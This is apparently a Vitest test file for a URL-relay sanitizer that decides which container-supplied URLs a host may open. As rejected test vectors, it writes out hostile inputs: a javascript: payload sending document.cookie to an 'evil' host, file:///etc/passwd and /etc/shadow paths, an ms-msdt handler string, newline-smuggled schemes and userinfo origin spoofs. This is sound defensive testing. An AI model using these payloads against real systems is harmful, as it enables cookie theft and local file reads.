import { describe, it, expect } from "vitest";
import {
  ANTHROPIC_SIGN_IN_HOSTS,
  MAX_RELAY_URL_LENGTH,
  RelayRateLimiter,
  URL_RELAY_OSC,
  parseUrlRelayOsc,
  sanitizeRelayUrl,
  urlOrigin,
} from "./urlRelay";

/** Build the OSC 7777 payload the container shim emits for `url`. */
function payloadFor(url: string): string {
  const bytes = new TextEncoder().encode(url);
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return `open;${btoa(binary)}`;
}

describe("URL_RELAY_OSC", () => {
  it("is the private identifier the container shim writes", () => {
    expect(URL_RELAY_OSC).toBe(7777);
  });
});

describe("sanitizeRelayUrl — accepts", () => {
  it("plain https URLs", () => {
    expect(sanitizeRelayUrl("https://github.com/login/device")).toBe(
      "https://github.com/login/device",
    );
  });

  it("plain http URLs", () => {
    expect(sanitizeRelayUrl("http://example.com/")).toBe("http://example.com/");
  });

  it("long OAuth URLs with query strings", () => {
    const url =
      "https://d-1234567890.awsapps.com/start/#/device?user_code=ABCD-EFGH&state=" +
      "x".repeat(200);
    expect(sanitizeRelayUrl(url)).toBe(url);
  });

  it("loopback callback URLs (the CLI, not the host, chose the port)", () => {
    expect(sanitizeRelayUrl("http://127.0.0.1:8123/callback?code=abc")).toBe(
      "http://127.0.0.1:8123/callback?code=abc",
    );
  });

  it("trims surrounding whitespace before validating", () => {
    expect(sanitizeRelayUrl("  https://example.com/x  ")).toBe(
      "https://example.com/x",
    );
  });

  it("normalizes so the toast shows exactly what will be opened", () => {
    expect(sanitizeRelayUrl("https://EXAMPLE.com")).toBe("https://example.com/");
  });

  it("keeps hyphens and other legal URL punctuation", () => {
    const url = "https://my-host.example.com/a-b_c~d/e.f?g=h-i#j-k";
    expect(sanitizeRelayUrl(url)).toBe(url);
  });
});

describe("sanitizeRelayUrl — rejects non-http(s) schemes", () => {
  // The whole point of the allowlist: the container must not be able to make
  // the host open a scheme that reaches local files, script, or an OS handler.
  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["javascript: with payload", "javascript:fetch('http://evil/'+document.cookie)"],
    ["file: absolute path", "file:///etc/passwd"],
    ["file: host share", "file://host/share/secret"],
    ["data:", "data:text/html,<script>alert(1)</script>"],
    ["vbscript:", "vbscript:msgbox(1)"],
    ["blob:", "blob:https://example.com/uuid"],
    ["ftp:", "ftp://example.com/x"],
    ["ssh:", "ssh://root@example.com"],
    ["mailto:", "mailto:someone@example.com"],
    ["ms-msdt: (protocol handler)", "ms-msdt:/id PCWDiagnostic"],
    ["smb:", "smb://server/share"],
    ["custom app handler", "slack://open?team=T123"],
    ["chrome:", "chrome://settings"],
    ["about:", "about:blank"],
  ])("rejects %s", (_label, url) => {
    expect(sanitizeRelayUrl(url)).toBeNull();
  });

  it("rejects case-variant javascript:", () => {
    expect(sanitizeRelayUrl("JaVaScRiPt:alert(1)")).toBeNull();
  });

  it("rejects a scheme smuggled past a naive check with an embedded newline", () => {
    // `new URL()` strips tabs and newlines, so "java\nscript:" would parse as
    // a javascript: URL. The pre-parse control-character check stops it.
    expect(sanitizeRelayUrl("java\nscript:alert(1)")).toBeNull();
    expect(sanitizeRelayUrl("java\tscript:alert(1)")).toBeNull();
    expect(sanitizeRelayUrl("\x00javascript:alert(1)")).toBeNull();
  });
});

describe("sanitizeRelayUrl — rejects malformed and hostile input", () => {
  it("rejects non-strings", () => {
    expect(sanitizeRelayUrl(undefined)).toBeNull();
    expect(sanitizeRelayUrl(null)).toBeNull();
    expect(sanitizeRelayUrl(42)).toBeNull();
    expect(sanitizeRelayUrl({ href: "https://example.com" })).toBeNull();
  });

  it("rejects the empty string", () => {
    expect(sanitizeRelayUrl("")).toBeNull();
    expect(sanitizeRelayUrl("   ")).toBeNull();
  });

  it("rejects scheme-less input", () => {
    expect(sanitizeRelayUrl("example.com")).toBeNull();
    expect(sanitizeRelayUrl("//example.com")).toBeNull();
    expect(sanitizeRelayUrl("/etc/passwd")).toBeNull();
  });

  it("rejects http(s) URLs with no host", () => {
    expect(sanitizeRelayUrl("http://")).toBeNull();
  });

  it("does not let an extra slash turn an https URL into a local path", () => {
    // WHATWG parsing treats the third slash as part of the authority, so this
    // stays a network URL to the (unresolvable) host "etc" — it never becomes
    // a read of /etc/passwd.
    expect(sanitizeRelayUrl("https:///etc/passwd")).toBe("https://etc/passwd");
  });

  it("rejects embedded credentials (origin spoofing)", () => {
    expect(
      sanitizeRelayUrl("https://github.com@evil.example.com/login"),
    ).toBeNull();
    expect(sanitizeRelayUrl("https://user:pass@example.com/")).toBeNull();
  });

  it("rejects control characters and whitespace inside the URL", () => {
    expect(sanitizeRelayUrl("https://example.com/\x1b]0;pwned\x07")).toBeNull();
    expect(sanitizeRelayUrl("https://example.com/a b")).toBeNull();
    expect(sanitizeRelayUrl("https://example.com/a\r\nb")).toBeNull();
  });

  it("tolerates a trailing newline from the shim's printf", () => {
    expect(sanitizeRelayUrl("https://example.com/x\n")).toBe(
      "https://example.com/x",
    );
  });

  it("rejects oversized URLs", () => {
    const huge = "https://example.com/" + "a".repeat(MAX_RELAY_URL_LENGTH);
    expect(huge.length).toBeGreaterThan(MAX_RELAY_URL_LENGTH);
    expect(sanitizeRelayUrl(huge)).toBeNull();
  });
});

describe("sanitizeRelayUrl — quote characters", () => {
  // Latent today, because the only path that would exploit it is behind a
  // feature flag. Latent is not the same as absent: the character class is the
  // thing standing between a container-supplied string and an OS opener that
  // on Windows has historically been reached through a command interpreter.
  it("rejects a double quote", () => {
    expect(sanitizeRelayUrl('https://example.com/a"b')).toBeNull();
    expect(sanitizeRelayUrl('https://example.com/?q="&x=1')).toBeNull();
  });

  it("rejects a single quote and a backtick", () => {
    expect(sanitizeRelayUrl("https://example.com/a'b")).toBeNull();
    expect(sanitizeRelayUrl("https://example.com/a`b")).toBeNull();
  });

  it("still accepts the percent-encoded forms", () => {
    expect(sanitizeRelayUrl("https://example.com/a%22b")).toBe(
      "https://example.com/a%22b",
    );
  });

  it("rejects C1 controls and exotic whitespace new URL() would keep", () => {
    expect(sanitizeRelayUrl("https://example.com/a\u0085b")).toBeNull();
    expect(sanitizeRelayUrl("https://example.com/a\u00a0b")).toBeNull();
    expect(sanitizeRelayUrl("https://example.com/a\u3000b")).toBeNull();
  });
});

describe("sanitizeRelayUrl — host allowlist", () => {
  const opts = { allowHosts: ANTHROPIC_SIGN_IN_HOSTS };

  it("accepts the domain itself and its subdomains", () => {
    expect(sanitizeRelayUrl("https://claude.ai/oauth/authorize", opts)).toBe(
      "https://claude.ai/oauth/authorize",
    );
    expect(
      sanitizeRelayUrl("https://platform.claude.com/oauth/code/callback", opts),
    ).toBe("https://platform.claude.com/oauth/code/callback");
  });

  it("rejects a lookalike that merely contains the domain", () => {
    expect(sanitizeRelayUrl("https://claude.ai.evil.tld/oauth", opts)).toBeNull();
    expect(sanitizeRelayUrl("https://notclaude.ai/oauth", opts)).toBeNull();
    expect(sanitizeRelayUrl("https://evil.tld/claude.ai/oauth", opts)).toBeNull();
  });

  it("rejects the userinfo spoof even though it reads as an allowed host", () => {
    expect(
      sanitizeRelayUrl("https://claude.ai@evil.tld/oauth/authorize", opts),
    ).toBeNull();
  });

  it("is case-insensitive about the host", () => {
    expect(sanitizeRelayUrl("https://CLAUDE.AI/oauth", opts)).toBe(
      "https://claude.ai/oauth",
    );
  });

  it("allows any host when no allowlist is given — the relay's whole point", () => {
    expect(sanitizeRelayUrl("https://github.com/login/device")).toBe(
      "https://github.com/login/device",
    );
  });
});

describe("urlOrigin", () => {
  it("returns the part that decides where credentials go", () => {
    expect(urlOrigin("https://claude.ai/oauth/authorize?code=true")).toBe(
      "https://claude.ai",
    );
    expect(urlOrigin("http://127.0.0.1:41703/callback")).toBe(
      "http://127.0.0.1:41703",
    );
  });

  it("returns null rather than guessing at unparseable input", () => {
    expect(urlOrigin("not a url")).toBeNull();
  });
});

describe("parseUrlRelayOsc", () => {
  it("decodes the sequence the container shim emits", () => {
    const url = "https://github.com/login/device";
    expect(parseUrlRelayOsc(payloadFor(url))).toBe(url);
  });

  it("round-trips non-ASCII URLs through UTF-8", () => {
    const url = "https://example.com/café";
    // WHATWG normalization percent-encodes the path.
    expect(parseUrlRelayOsc(payloadFor(url))).toBe(
      "https://example.com/caf%C3%A9",
    );
  });

  it("applies the scheme allowlist to the decoded payload", () => {
    expect(parseUrlRelayOsc(payloadFor("javascript:alert(1)"))).toBeNull();
    expect(parseUrlRelayOsc(payloadFor("file:///etc/shadow"))).toBeNull();
  });

  it("rejects an unknown verb", () => {
    const body = payloadFor("https://example.com/").split(";")[1];
    expect(parseUrlRelayOsc(`exec;${body}`)).toBeNull();
    expect(parseUrlRelayOsc(`;${body}`)).toBeNull();
  });

  it("rejects payloads with no separator", () => {
    expect(parseUrlRelayOsc("open")).toBeNull();
    expect(parseUrlRelayOsc("")).toBeNull();
  });

  it("rejects an empty body", () => {
    expect(parseUrlRelayOsc("open;")).toBeNull();
  });

  it("rejects non-base64 bodies without throwing", () => {
    expect(parseUrlRelayOsc("open;!!!not base64!!!")).toBeNull();
    expect(parseUrlRelayOsc("open;https://example.com")).toBeNull();
  });

  it("rejects a body that decodes to invalid UTF-8", () => {
    expect(parseUrlRelayOsc(`open;${btoa("\xff\xfe")}`)).toBeNull();
  });

  it("rejects an absurdly large body before decoding", () => {
    expect(parseUrlRelayOsc(`open;${"A".repeat(MAX_RELAY_URL_LENGTH * 2 + 4)}`))
      .toBeNull();
  });
});

describe("RelayRateLimiter", () => {
  it("allows the first request", () => {
    const rl = new RelayRateLimiter();
    expect(rl.allow("https://a.example/", 0)).toBe(true);
  });

  it("suppresses a repeat of the same URL inside the dedupe window", () => {
    const rl = new RelayRateLimiter(5, 10_000, 5_000);
    expect(rl.allow("https://a.example/", 0)).toBe(true);
    expect(rl.allow("https://a.example/", 1_000)).toBe(false);
    expect(rl.allow("https://a.example/", 4_999)).toBe(false);
  });

  it("allows the same URL again after the dedupe window", () => {
    const rl = new RelayRateLimiter(5, 10_000, 5_000);
    expect(rl.allow("https://a.example/", 0)).toBe(true);
    // Repeats keep pushing the dedupe deadline out; measure from the last one.
    expect(rl.allow("https://a.example/", 6_000)).toBe(true);
  });

  it("caps the number of distinct prompts in the sliding window", () => {
    const rl = new RelayRateLimiter(3, 10_000, 1_000);
    expect(rl.allow("https://a.example/", 0)).toBe(true);
    expect(rl.allow("https://b.example/", 1_500)).toBe(true);
    expect(rl.allow("https://c.example/", 3_000)).toBe(true);
    expect(rl.allow("https://d.example/", 4_500)).toBe(false);
    expect(rl.allow("https://e.example/", 6_000)).toBe(false);
  });

  it("recovers once the window slides past the old requests", () => {
    const rl = new RelayRateLimiter(2, 10_000, 1_000);
    expect(rl.allow("https://a.example/", 0)).toBe(true);
    expect(rl.allow("https://b.example/", 100)).toBe(true);
    expect(rl.allow("https://c.example/", 200)).toBe(false);
    expect(rl.allow("https://c.example/", 10_200)).toBe(true);
  });
});
